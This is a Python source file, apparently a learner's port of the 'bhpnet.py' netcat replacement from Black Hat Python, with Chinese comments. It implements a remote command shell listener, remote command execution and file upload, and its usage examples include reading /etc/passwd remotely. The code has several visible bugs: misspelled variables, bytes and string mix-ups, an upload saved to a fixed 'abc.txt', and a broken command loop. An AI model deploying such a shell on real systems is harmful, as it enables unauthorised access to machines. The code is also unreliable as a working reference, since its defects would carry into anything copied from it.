#!/usr/bin/env python3
import sys
import socket
import getopt
import threading
import subprocess

listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

# this runs a command and returns the output
def run_command(command):
    #換掉換行符號
    command = command.rstrip()

    #執行指令並取回輸出
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = "指令執行失敗.\r\n"

    return output

# this handles incoming client connections
def client_hanlder(client_socket):
    global upload
    global execute
    global command

    #檢查上傳
    if len(upload_destination):
        
        #讀入所有bytes並寫到指定的位置
        file_buffer=""

        #一直讀到沒有資料可讀為止
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer+=data

        #然後試著把這些資料寫入檔案
        try:
            with open('abc.txt','wb') as file_descriptor:
                file_descriptor.write(file_buffer)
                file_descriptor.close()

                # acknowledge that we wrote the file out
                client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
    
    #check for command execution
    if len(execute):
        
        #run the command
        output = run_command(execute)

        client_socket.send(output)

     #now we go to another new loop if a command shell was requtsted
    if command:
        
        while True:
            
            #show a simple prompt
            prompt="<BHP:#>"
            client_socket.sendto(prompt.encode(encoding='utf_8'),(target,port))

            #we will receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                data=client_socket.recv(1024)
                cmd_buffer +=data.decode()

                
                # we have a valid command so execute it and send back the results
                response = run_command(cmd_buffer)

                # send back the response
                client_socket.send(response.encode(encoding='utf_8'),(target,port))

# this is for incoming connections
def server_loop():
    global target

    #若沒定義目標,就監聽所有介面
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket,addr = server.accept()
        client_thrad = threading.Thread(target=client_hanlder,args=(client_socket,))
        client_thrad.start()

# if we don't listen we are a client....make it so.
def client_sender(buffer):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    try:
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)
        
        while True:
            recv_len = 1
            response =""

            while recv_len:
                data     = client.recv(4096)
                recv_len = len(data)
                response+=data

                if recv_len < 4096:
                    break
                
                print (reponse)

                buffer = input();
                buffer +="\n"

                #傳出去
                client.send(buffer)
    except:
        print("[*] Exception! Exiting!!")
        client.close()

def usage():
        print ("Netcat Replacement")
        print ("Usage: bhpnet.py -t target_host -p port")
        print ("-l --listen                - listen on [host]:[port] for incoming connections")
        print ("-e --execute=file_to_run   - execute the given file upon receiving a connection")
        print ("-c --command               - initialize a command shell")
        print ("-u --upload=destination    - upon receiving connection upload a file and write to [destination]")       
        print ("Examples: ")
        print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
        print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
        print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
        print ("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
        sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    #read the commandline options    
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
            print(str(err))
            usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            excute = a
        elif o in ("-c","--commandshell"):
           command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t","--target"):
           target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"選項未處理"

    if not listen and len(target) and port >0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    if listen:
        server_loop()

main()
